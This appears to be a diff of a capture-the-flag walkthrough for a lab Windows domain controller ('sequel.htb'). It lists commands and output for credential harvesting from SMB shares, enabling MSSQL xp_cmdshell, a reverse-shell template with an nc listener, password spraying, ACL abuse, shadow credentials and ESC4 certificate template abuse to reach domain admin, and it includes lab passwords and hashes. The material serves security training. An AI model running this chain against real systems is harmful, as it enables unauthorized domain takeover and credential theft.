@@ -2,7 +2,7 @@
 - As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su
 ## Nmap Enumeration
 - We pass the commands:
-	```bash
+```
 nmap -sV -sC -vv 10.10.11.51
 nmap -sU --top-ports=10 -vv 10.10.1
 
@@ -195,14 +195,14 @@ Host script results:
 ---
 ## BloodHound
 - Grab file for BloodHound enumeration:
-	```bash
+```
 bloodhound-python --dns-tcp -ns 10.10.11.51 -d sequel.htb -u 'rose' -p 'KxEPkKe6R8su' -c all
 ```
-	- Mark Rose owned
+- Mark Rose owned
 ----
 ## SMB Enumeration
 - t
-	```bash
+```
 netexec smb 10.10.11.51 -p 'KxEPkKe6R8su' -u 'rose' --shares
 
 ---OUTPUT---
@@ -219,29 +219,29 @@ SMB         10.10.11.51     445    DC01             NETLOGON        READ        
 SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
 SMB         10.10.11.51     445    DC01             Users           READ 
 ```
-	- Account Department has some creds
-		- Domain sequel.htb
-		- username:pwd
-			```bash
+- Account Department has some creds
+	- Domain sequel.htb
+	- username:pwd
+```
 angela:0fwz7Q4mSpurIt99
 oscar:86LxLBMgEWaKUnBG
 kevin:Md9Wlq1E5bZnVDVo
 sa:MSSQLP@ssw0rd!
 ```
 - I try with winrm but they all fail. Then I try with mssqlclient and get a hit:
-	```bash
+```
 impacket-mssqlclient sequel.htb/'sa:MSSQLP@ssw0rd!'@10.10.11.51
 ```
 - I try to enable xp_cmdshell to see if i can pass commands (can use xp_dirtree but can't do much with that)
 	- was disabled
 - https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
 	- shows how to enable (if we have privileges)
-		```bash
+```
 EXEC sp_configure 'xp_cmdshell', 1
 RECONFIGURE;
 ```
 - Then using xp_cmdshell I enumerated around and found :
-	```bash
+```
 EXEC xp_cmdshell 'whoami'
 EXEC xp_cmdshell 'dir "C:\SQL2019\ExpressAdv_ENU"'
 EXEC xp_cmdshell 'type "C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI"'
@@ -284,14 +284,14 @@ NULL
 -------
 - (Not working..) Alternatively can use : https://github.com/Mayter/mssql-command-tool/releases/tag/mssql
 	- Can use it to get a reverse shell as sql_svc and then search for the sql INI file.
-		```bash
+```
 ./mssql-command-tools_Linux_amd64 --host 10.10.11.51 -u "sa" -p 'MSSQLP@ssw0rd!' -c "powershell -e yourbase64here"
    
 --ON-LOCAL-MACHINE--
 nc -lvnp 9999
 ```
-		- Instead we can also pass this directly in our xp_cmdshell:
-			```bash
+- Instead we can also pass this directly in our xp_cmdshell:
+```
 
 ```
 ---------
@@ -299,7 +299,7 @@ nc -lvnp 9999
 	- I try crackmapexec and we get a hit on smb but nothing for winrm.
 		- SMB share doesn't give us anything new
 - I check users in target:
-	```bash
+```
 EXEC xp_cmdshell 'net users'
 ---OUTPUT---
 output                                                                            
@@ -324,8 +324,8 @@ NULL
 
 NULL
 ```
-	- I have a user list. I add the extra names there and perform spray
-		```bash
+- I have a user list. I add the extra names there and perform spray
+```
 cat users
 crackmapexec winrm 10.10.11.51 -u users -p 'WqSZAF6CysDQbGb3' -d sequel.htb --no-bruteforce
 
@@ -345,14 +345,14 @@ WINRM       10.10.11.51     5985   10.10.11.51      [+] sequel.htb\ryan:WqSZAF6C
 
 ```
 - We login to target with creds:
-	```bash
+```
 evil-winrm -i 10.10.11.51 -p 'WqSZAF6CysDQbGb3' -u 'ryan'
 ```
-	- Can grab user flag
+- Can grab user flag
 - Mark ryan owned in BloodHound
 -  Under  OUTBOUND OBJECT CONTROL > First Degree Object Control we see ryan has WriteOwner privilges over ca_svc i.e can change owner of ca_svc
 	- Add owner:
-		```bash
+```
 impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
 
 ---OUTPUT---
@@ -365,12 +365,12 @@ impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'
 [*] OwnerSid modified successfully!
 
 ```
-	- Add rights:
-		```bash
+- Add rights:
+```
 impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
 ```
-	- Get hash:
-		```bash
+- Get hash:
+```
 python3 /opt/targetedKerberoast/targetedKerberoast.py -v -d 'sequel.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3'
 
 ---OUTPUT---
@@ -383,15 +383,15 @@ $krb5tgs$23$*ca_svc$SEQUEL.HTB$sequel.htb/ca_svc*$760b414d120f6542f1ecf2207d9723
 
 ```
 - Trying to crack hash with john :
-	```bash
+```
 vi hash # copy hash here
 john hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
-	- Nothing cracks
+- Nothing cracks
 - I then try shadow credentials attack:
 	- Two ways:
 		- Certipy:
-			```bash
+```
 certipy shadow auto -target sequel.htb -dc-ip 10.10.11.51 -username 'ryan@sequel.htb' -password 'WqSZAF6CysDQbGb3' -account 'ca_svc'
 
 ---OUTPUT---
@@ -412,8 +412,8 @@ certipy shadow auto -target sequel.htb -dc-ip 10.10.11.51 -username 'ryan@sequel
 [*] Successfully restored the old Key Credentials for 'ca_svc'
 [*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
 ```
-		- pywhisker + getpkinit
-			```bash
+- pywhisker + getpkinit
+```
 python3 /opt/pywhisker/pywhisker/pywhisker.py -d "sequel.htb" -u "ryan" -p "WqSZAF6CysDQbGb3" --target "ca_svc" --action "add"   
 
 ---OUTPUT---
@@ -432,8 +432,8 @@ python3 /opt/pywhisker/pywhisker/pywhisker.py -d "sequel.htb" -u "ryan" -p "WqSZ
 [*] Must be used with password: bT4MxQvEBfyIDXLVosWm
 [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
 ```
-		- Then with getpkinit (there is some minkerberos issue with this so we need to do it via a virtual env):
-			```bash
+- Then with getpkinit (there is some minkerberos issue with this so we need to do it via a virtual env):
+```
 sudo su
 virtualenv venv
 source venv/bin/activate
@@ -455,7 +455,7 @@ INFO:minikerberos:Saved TGT to file
 
 ```
 - Finally we grab the hash:
-	```bash
+```
 export KRB5CCNAME=ca_svc.ccache
 python3 /opt/PKINITtools/getnthash.py sequel.htb/ca_svc -key e6744c1c3867176b006bc6142325d6e8bafd8d15c3dcec5e6cb9dd1cd43b67af   
 
@@ -469,7 +469,7 @@ Recovered NT Hash
 
 ```
 - We try to check with crackmapexec:
-	```bash
+```
 netexec smb 10.10.11.51 -u 'ca_svc' -H '3b181b914e7a9d5508ea1e20bc2b7fce'
 netexec winrm 10.10.11.51 -u 'ca_svc' -H '3b181b914e7a9d5508ea1e20bc2b7fce'
 ```
@@ -481,7 +481,7 @@ netexec winrm 10.10.11.51 -u 'ca_svc' -H '3b181b914e7a9d5508ea1e20bc2b7fce'
 
 ---
 - I use certipy to check for any vulnerabilitie:
-	```bash
+```
 certipy find -u 'ca_svc' -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -target 10.10.11.51 -stdout -vulnerable
 
 ---OUTPUT---
@@ -570,11 +570,11 @@ Certificate Templates
 - https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/
 	- Shows how to exploit ESC4 involving misconfigurations on the certificate template. These security issues arise when a non-administrator account can modify a certificate template and as a result gain access to privileged resources such as domain controller.
 - Certipy template arguments
-	```bash
+```
 certipy template --help
 ```
 - Modify the certificate:
-	```bash
+```
 certipy template -dc-ip 10.10.11.51 -u ca_svc -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -template DunderMifflinAuthentication -target sequel.htb -save-old
 
 ---OUTPUT---
@@ -585,7 +585,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Successfully updated 'DunderMifflinAuthentication'
 ```
 - Request domain admin certificate using the modified template:
-	```bash
+```
 certipy req -ca sequel-DC01-CA -dc-ip 10.10.11.51 -u ca_svc -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -template DunderMifflinAuthentication -target sequel.htb -upn administrator@sequel.htb
 
 ---OUTPUT---
@@ -598,11 +598,11 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Certificate has no object SID
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
-	- Note that this fails a few times for some reason...(a failed to find domain name error)
-		- I used -dns and -ns arguments but that didn't change much but when I redo the certipy template command and pass this quickly it ended up working.
-			- Either time-gated or some other issue and the template command was irrelevant
+- Note that this fails a few times for some reason...(a failed to find domain name error)
+	- I used -dns and -ns arguments but that didn't change much but when I redo the certipy template command and pass this quickly it ended up working.
+		- Either time-gated or some other issue and the template command was irrelevant
 - request the domain admin TGT Ticket or the administrator hash to gain access to the domain controller.
-	```bash
+```
 certipy auth -pfx administrator.pfx -domain 'sequel.htb'   
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
@@ -614,7 +614,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
 ```
 - We can now login as admin:
-	```bash
+```
 evil-winrm -i 10.10.11.51 -u 'Administrator' -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
 
 --OR--
@@ -649,6 +649,6 @@ Microsoft Windows [Version 10.0.17763.6640]
 C:\Windows\system32> whoami
 nt authority\system
 ```
-	- We can now grab root.txt
+- We can now grab root.txt
 -------
 --------
